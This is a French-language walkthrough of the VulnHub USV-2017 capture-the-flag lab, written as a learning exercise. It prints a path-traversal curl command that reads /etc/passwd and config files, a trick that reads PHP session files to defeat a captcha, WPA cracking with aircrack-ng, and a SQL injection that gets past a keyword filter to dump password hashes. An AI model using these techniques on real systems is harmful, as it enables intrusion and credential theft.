# Solution du CTF USV-2017 de VulnHub

Ce CTF [disponible sur VulnHub](https://www.vulnhub.com/entry/usv-2017,219/) a été initialement créé par l'*Université de Suceava* (Roumanie) et la société *Safetech Innovations*.  

Le challenge était destiné à des étudiants. Même s'il n'était pas d'un grand niveau technique il était sympa à faire avec la recherche de 5 flags différents portant des noms de pays.  

Italie
------

```plain
Nmap scan report for 192.168.2.2
Host is up (0.00022s latency).
Not shown: 65522 closed ports
PORT      STATE    SERVICE    VERSION
21/tcp    open     ftp        ProFTPD 1.3.5b
22/tcp    open     ssh        OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp    open     http       Apache httpd
|_http-title: Site doesn't have a title (text/html).
4369/tcp  open     epmd       Erlang Port Mapper Daemon
| epmd-info: 
|   epmd running on port 4369
|_  name ejabberd at port 44843
5222/tcp  open     jabber     ejabberd (Protocol 1.0)
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
| 
|     compression_methods: 
| 
|     errors: 
|       host-unknown
|       host-unknown
|       (timeout)
|     auth_mechanisms: 
| 
|     xmpp: 
|       lang: en
|       server name: localhost
|       version: 1.0
|     stream_id: 18195429015329401171
|     capabilities: 
| 
|_    features: 
5269/tcp  open     jabber     ejabberd
| xmpp-info: 
|   Ignores server name
|   info: 
|     xmpp: 
|       version: 1.0
|     capabilities: 
| 
|   pre_tls: 
|     xmpp: 
| 
|     capabilities: 
| 
|     features: 
|       TLS
|   post_tls: 
|     xmpp: 
| 
|_    capabilities: 
5280/tcp  open     xmpp-bosh?
15020/tcp open     http       Apache httpd
|_http-title: 400 Bad Request
16821/tcp filtered unknown
42893/tcp filtered unknown
44843/tcp open     unknown
46760/tcp filtered unknown
57440/tcp filtered unknown
MAC Address: 08:00:27:C5:25:00 (Cadmus Computer Systems)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.11 - 3.14
Network Distance: 1 hop
Service Info: Host: localhost; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Les points qui sautent au yeux sont la présence d'au moins deux ports web et la présence de services XMPP.  

Quand on se rend sur le port 80 on est rapidement mis dans le thème du challenge à savoir l'utilisation des [Minions](https://fr.wikipedia.org/wiki/Les_Minions) qui nous demandent de libérer l'un des leurs.  

Un dirbuster plus tard on trouve le dossier */admin2/* qui demande un mot de passe.  

Derrière ce formulaire se cache le code Javascript suivant :  

```javascript
var _0xeb5f=["\x76\x61\x6C\x75\x65","\x70\x61\x73\x73\x69\x6E\x70","\x70\x61\x73\x73\x77\x6F\x72\x64","\x66\x6F\x72\x6D\x73","\x63\x6F\x6C\x6F\x72","\x73\x74\x79\x6C\x65","\x76\x61\x6C\x69\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x67\x72\x65\x65\x6E","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x49\x74\x61\x6C\x79\x3A","\x72\x65\x64","\x49\x6E\x63\x6F\x72\x72\x65\x63\x74\x21"];
function validate(){var _0xb252x2=123211;var _0xb252x3=3422543454;var _0xb252x4=document[_0xeb5f[3]][_0xeb5f[2]][_0xeb5f[1]][_0xeb5f[0]];var _0xb252x5=md5(_0xb252x4);_0xb252x4+= 4469;_0xb252x4-= 234562221224;_0xb252x4*= 1988;_0xb252x2-= 2404;_0xb252x3+= 2980097;
if(_0xb252x4== 1079950212331060){document[_0xeb5f[7]](_0xeb5f[6])[_0xeb5f[5]][_0xeb5f[4]]= _0xeb5f[8];document[_0xeb5f[7]](_0xeb5f[6])[_0xeb5f[9]]= _0xeb5f[10]+ _0xb252x5}
else {document[_0xeb5f[7]](_0xeb5f[6])[_0xeb5f[5]][_0xeb5f[4]]= _0xeb5f[11];document[_0xeb5f[7]](_0xeb5f[6])[_0xeb5f[9]]= _0xeb5f[12]};return false}
```

Avec un peu de déobfuscation on obtient alors le code suivant :  

```javascript
_0xeb5f = [
  'value',
  'passinp',
  'password',
  'forms',
  'color',
  'style',
  'valid',
  'getElementById',
  'green',
  'innerHTML',
  'Italy:',
  'red',
  'Incorrect!'
]

function validate() {
  var _0xb252x2=123211;
  var _0xb252x3=3422543454;
  var _0xb252x4 = document['forms']['password']['passinp']['value'];
  var _0xb252x5=md5(_0xb252x4);
  _0xb252x4+= 4469;
  _0xb252x4-= 234562221224;
  _0xb252x4*= 1988;
  _0xb252x2-= 2404;
  _0xb252x3+= 2980097;

  if(_0xb252x4== 1079950212331060) {
    document['getElementById']('valid')['style']['color']= 'green';
    document['getElementById']('valid')['innerHTML']= 'Italy:' + _0xb252x5
  } else {
    document['getElementById']('valid')['style']['color']= 'red';
    document['getElementById']('valid')['innerHTML']= 'Incorrect!';
  }
  return false
}
```

On comprend vite que si on veut obtenir le flag de l'Italie il faut que la variable *\_0xb252x4* vaille 1079950212331060.  

On serait tenté de se dire qu'il suffit de faire le calculer l'inverse à savoir (1079950212331060 / 1988) + 234562221224 - 4469 pour le rentrer dans le formulaire et obtenir le flag.  

Sauf que la première addition réalisée est en réalité une concaténation. Du coup au lieu de saisir ce que l'on pensait d'abord être 777796730000 il faut rentrer 77779673 ce qui nous donne le flag suivant :  

**Italy:46202df2ae6c46db8efc0af148370a78**
Croatie
-------

Cette fois on se rend sur le port 15020 (Apache en HTTPS), on lance à nouveau un dirbuster et on trouve les dossiers suivants :  

```plain
https://192.168.2.2:15020/blog/
https://192.168.2.2:15020/vault/
```

La première adresse parle d'elle-même, la seconde est une arborescence bien chargée où chaque dossier a un nombre important de sous dossiers.  

J'ai décidé de me concentrer d'abord sur le blog. Ce dernier a des liens cassés mais globalement le format d'URL pour les articles est le suivant :  

```plain
https://192.168.2.2:15020/blog/post.php?id=3
```

En particulier ici on tombe sur le journal de *Kevin*. En commentaire de l'article on peut lire *I keep a flag.txt in my house* et commenté dans le code HTML se trouve une référence à *download.php*.  

Le script *download.php* nous retourne l'erreur *'image' parameter is empty. Please provide file path in 'image' parameter*.  

Si on passe la variable *image* en paramètre, même résultat. Il faut donc envoyer le paramètre par POST (en gros via formulaire pour les non-initiés).  

Avec la commande suivante on peut donc récupérer le flag présent dans le dossier personnel de Kevin :  

```bash
curl -X POST https://192.168.2.2:15020/blog/download.php --data "image=/home/kevin/flag.txt" -k
```

**Croatia: e4d49769b40647eddda2fe3041b9564c**  

J'en profite pour récupérer le fichier /etc/passwd dont voici un extrait :  

```plain
teo:x:1000:1000:teo,,,:/home/teo:/bin/bash
kevin:x:1001:1001::/home/kevin:
ejabberd:x:111:114::/var/lib/ejabberd:/bin/sh
oana:x:1002:1002::/home/oana:
```

En dehors de kevin les deux autres utilisateurs n'ont pas de shell définit. On a aussi un path pour le serveur jabber au cas où.  

Et on remarque via */etc/group* que *teo* est le seul utilisateur intéressant :  

```plain
cdrom:x:24:teo
floppy:x:25:teo
audio:x:29:teo
dip:x:30:teo
video:x:44:teo
plugdev:x:46:teo
netdev:x:108:teo
teo:x:1000:
```

Philippines
-----------

J'ai décidé de fouiller du côté de la configuration *Apache*. Au lieu d'écrire un n-ième script Python j'ai choisi d'utiliser *ZAP* en faisant d'abord transiter une requête bidon via le proxy intercepteur qui nous servira de template pour un fuzzing via dictionnaire.  

Dans *ZAP* on fait un click-droit sur la requête puis *Attaquer* puis *Générer du bruit*. On sélectionne ensuite la valeur bidon de la requête initiale et on la définie comme zone de fuzzing.  

Il faut ensuite sélectionner un dictionnaire contenant des paths de fichiers intéressants (j'en ai un perso mais ça peut se trouver sur le web).  

![ZAP generate noise location](https://raw.githubusercontent.com/devl00p/blog/master/images/ctf2017_zap_brute.png)

Quand le fuzz a fini on fait un simple tri sur la taille des pages retournées ce qui nous permet de trouver le bon path pour la config d'Apache.  

![ZAP fuzzing results](https://raw.githubusercontent.com/devl00p/blog/master/images/ctf2017_dir_traversal_zap.png)

On en déduit facilement le chemin (heureusement celui par défaut) pour le sites-enabled : */etc/apache2/sites-enabled/000-default.conf* contenant le *DocumentRoot* (*/var/www/html*).  

Pas mal mais ce qui nous intéresse c'est surtout la configuration pour la partie SSL du site qui nous permettrait de fouiller par exemple dans le fichier */blog/admin/login.php*.  

A la mano et après quelques essais rapides je trouve le bon chemin : */etc/apache2/sites-enabled/default-ssl.conf*. Ce fichier a quelques infos comme :  

```plain
DocumentRoot /var/www/ssl
SSLCertificateFile /etc/ssl/localcerts/apache.pem
SSLCertificateKeyFile /etc/ssl/localcerts/apache.key
```

J'en profite pour lire le contenu du code PHP pour le blog et dans le fichier */var/www/ssl/blog/admin/index.php* je trouve un autre flag :  

**Philippines: 551d3350f100afc6fac0e4b48d44d380**  

Il s'avère à posteriori que je n'étais pas sensé trouver ce flag comme ça... encore un *Kansas City Shuffle* involontaire :p   

Le fichier */var/www/ssl/blog/classes/db.php* est celui qui contient les identifiants SQL :  

```php
<?php

    $lnk = mysql_connect("localhost", "mini", "password000");
    $db = mysql_select_db('blog', $lnk);

?>
```

Mais de tous ceux que j'ai dumpé, le plus prometteur était */var/www/ssl/blog/admin/edit.php* :  

```php
<?php                                                                                                                                                                                                                                         
  require("../classes/auth.php");                                                                                                                                                                                                             
  require("header.php");                                                                                                                                                                                                                      
require("../classes/fix_mysql.php");
  require("../classes/db.php");
  require("../classes/phpfix.php");
  require("../classes/post.php");

$sql = strtolower($_GET['id']);
  $sql = preg_replace("/union select|union all select|sleep|having|count|concat|and user|and isnull/", " ", $sql);
$post = Post::find($sql);
//  if (isset($_POST['title'])) {
//    $post->update($_POST['title'], $_POST['text']);
//  } 
?>

  <form action="" method="POST" enctype="multipart/form-data">
    Title: 
    <input type="text" name="title" value="<?php echo htmlentities($post->title); ?>" /> <br/>
    Text: 
      <textarea name="text" cols="80" rows="5">
        <?php echo htmlentities($post->text); ?>
       </textarea><br/>

    <input type="submit" name="Update" value="Update">

  </form>

<?php
  require("footer.php");

?>
```

avec la fonction *find()* utilisée :  

```php
function find($id) {
    $result = mysql_query("SELECT * FROM posts where id=".$id);
    $row = mysql_fetch_assoc($result); 
    if (isset($row)){
        $post = new Post($row['id'],$row['title'],$row['text'],$row['published']);
    }
    return $post;
}
```

On a ici une faille SQL protégée à la va vite par le retrait de certains mots clés. Le truc c'est qu'on ne peut pas accéder directement au script car *classes/auth.php* nous bloque l'accès en vérifiant l'authentification :  

```php
<?php
  session_start();
  require('../classes/fix_mysql.php'); 
  require('../classes/db.php'); 
  require('../classes/user.php'); 
  require_once '../classes/securimage/securimage.php';

  if (isset($_POST["user"]) and isset($_POST["password"]) ) {
    $image = new Securimage();
    if ($image->check($_POST['captcha_code']) == true) {
        //      echo "Correct!";
    } else {
        echo "Sorry, wrong code.";
        header( 'Location: login.php' ) ;
        die();
    }
  }

  if (isset($_POST["user"]) and isset($_POST["password"]) )
    if (User::login($_POST["user"],$_POST["password"]))  
      $_SESSION["admin"] = User::SITE;

  if (!isset($_SESSION["admin"] ) or $_SESSION["admin"] != User::SITE) {
    header( 'Location: login.php' ) ;
    die();
  }
?>
```

Evidemment les identifiants vus plus tôt ne permettent pas l'accès à la section admin... et la présence du captcha *Securimage* rend compliqué le brute force des identifiants... mais pas impossible.  

Je m'explique : on a accès aux fichiers du serveurs avec les droits d'Apache. Les données liés au cookies sont stockées au format JSON sur le serveur du coup si *Securimage* stocke la valeur attendue d'un captcha dans un cookie on peut la retrouver dans le bon fichier de session.  

Il nous faut d'abord retrouver le chemin des sessions PHP défini dans le fichier de configuration... à retrouver aussi, ce qui n'est pas bien difficile quand on sait à quel distrib on a à faire : */etc/php/7.0/apache2/php.ini*.  

Les lignes qui nous intéressent le plus :  

```plain
allow_url_fopen = On                                                                                                   
allow_url_include = Off
;session.save_path = "/var/lib/php/sessions"
```

Certes le chemin est commenté mais c'est celui par défaut. Je vois avec *EditMyCookie* que mon identifiant de session PHPSESSID est *mvmt1duldlu7fvrs5jm38hpel0*. Dès lors je dumpe le contenu du fichier */var/lib/php/sessions/sess\_mvmt1duldlu7fvrs5jm38hpel0* :  

```plain
securimage_code_disp|a:1:{s:7:"default";s:6:"reDMGY";}securimage_code_value|a:1:{s:7:"default";s:6:"redmgy";}securimage_code_ctime|a:1:{s:7:"default";i:1519726037;}securimage_code_audio|a:1:{s:7:"default";N;}
```

Bingo ! Je retrouve bien le code attendu par le *Securimage* (reDMGY) donc je pourrais brute-forcer le formulaire de login moyennant une requête intermédiaire...  

Mais avant de faire un second *Kansas City Shuffle* :'D je préfère voir ailleurs si il n'y a pas un autre moyen d'accéder à cette section admin.  

Au pire je perd un peu de temps et l'article s'enrichit de cette approche originale :)  

Laos
----

Il est temps de se pencher sur le dossier vault et tout son bazar. La méthode la plus simple consiste à tout récupérer via wget :  

```bash
wget --recursive --no-parent  https://192.168.2.2:15020/vault/ --no-check-certificate
```

Puis de chercher les fichiers qui ne sont pas les index :  

```bash
find . -type f ! -name "*index*"
```

Ce qui nous amène deux fichiers :  

```plain
./192.168.2.2:15020/vault/Door222/Vault70/ctf.cap                                                                                                                                                                                             
./192.168.2.2:15020/vault/Door223/Vault1/rockyou.zip
```

Ouvert avec Wireshark le fichier cap est une capture d'un trafic 802.11 (wifi) quand à rockyou c'est la wordlist bien connue... Il faut donc lancer *aircrack-ng* à l'aide de ces deux fichiers :  

```bash
aircrack-ng -w rockyou.txt ctf.cap
```

Et ça tombe :  

```plain
                                 Aircrack-ng 1.2 beta3

                   [00:34:56] 3448372 keys tested (1674.08 k/s)

                          KEY FOUND! [ minion.666 ]

      Master Key     : CA 8E A6 F3 BB 7F 29 CD D9 F8 91 43 CC 26 2D B6
                       8C 1A 05 1A 39 67 94 5A 60 81 E6 6F FF 91 0F 28

      Transient Key  : 9E DD C0 66 D0 3B 99 A5 9F 41 D6 F9 40 95 55 04
                       B1 87 ED 42 24 1A A2 6C B3 C5 36 D2 62 46 AB 28
                       92 D6 09 8D B8 69 23 C7 EB 2E 01 0E CB BB 40 36
                       6F 11 68 CC 99 80 DF 36 FC 8D 8A 48 50 88 F9 C1

      EAPOL HMAC     : FB C1 48 13 17 D1 EA 23 FE CF 93 52 97 0B 83 4A
```

Avec le password WPA ainsi obtenu je m'attendais à trouver quelque chose d'utile dans le trafic [déchiffré](https://wiki.wireshark.org/HowToDecrypt802.11)... mais rien à voir.  

Et là les identifiants *admin* / *minion.666* permettent l'accès à l'administration du blog :p   

C'était donc à ce moment là que j'aurais du obtenir le flag des *Philippines*.  

Le substitution en place pour la protection SQL est plutôt facile à passer. Ainsi si on place deux espaces entre *union* et *select* ça passe :  

```plain
/blog/admin/edit.php?id=10%20union%20%20select%201,2,user(),3;
```

L'utilisateur MySQL courant est *mini@localhost* et la base *blog* mais on le sait déjà. Il faut fouiller dans la classe PHP *User* pour savoir où fouiller :  

```php
<?php
class User {
  const SITE= "BLOG";
  function login($user, $password) {
    $sql = "SELECT * FROM users where login=\"";
    $sql.= mysql_real_escape_string($user);
    $sql.= "\" and password=md5(\"";
    $sql.= mysql_real_escape_string($password);
    $sql.= "\")";
    $result = mysql_query($sql);
    if ($result) {
      $row = mysql_fetch_assoc($result);
      if ($user === $row['login']) {
        return TRUE;
      }
    }
    else 
      echo mysql_error();
    return FALSE;
    //die("invalid username/password");
  }
}
?>
```

On part alors sur l'injection *union select 1,login,password,3 from users where id=1* pour obtenir le premier utilisateur du blog puis on incrémente :  

admin / 8ae100f50c9bbcfeb2ab87b72a03273d  

**Laos / 66c578605c1c63db9e8f0aba923d0c12**  

Gotcha !  

On aura pu se servir de sqlmap pour dumper le contenu des bases mais écrire un tamper script pour si peu... bof.

France
------

Le seul flag restant est la France... c'est ballot.  

Quand il y a plusieurs flags à trouver il y en a un généralement caché... juste devant nous. Ça n'a pas raté :  

```plain
$ openssl s_client -connect 192.168.2.2:15020
CONNECTED(00000003)
depth=0 C = FR, ST = Paris, L = Paris, O = CTF, CN = a51f0eda836e4461c3316a2ec9dad743, emailAddress = ctf@root.local
verify error:num=18:self signed certificate
verify return:1
```

Finish
------

Voilà, pas de boot2root ici, ce qui laisse un peu sur la faim. J'ai fouillé dans la conf jabber (*/etc/default/ejabberd*, */etc/ejabberd/ejabberd.yml*, */etc/ejabberd/modules.d*) sans rien trouver d'intéressant. Je pense que ces services étaient juste destinés à laisser les participants communiquer durant l'exercice.  


*Published March 09 2018 at 18:33*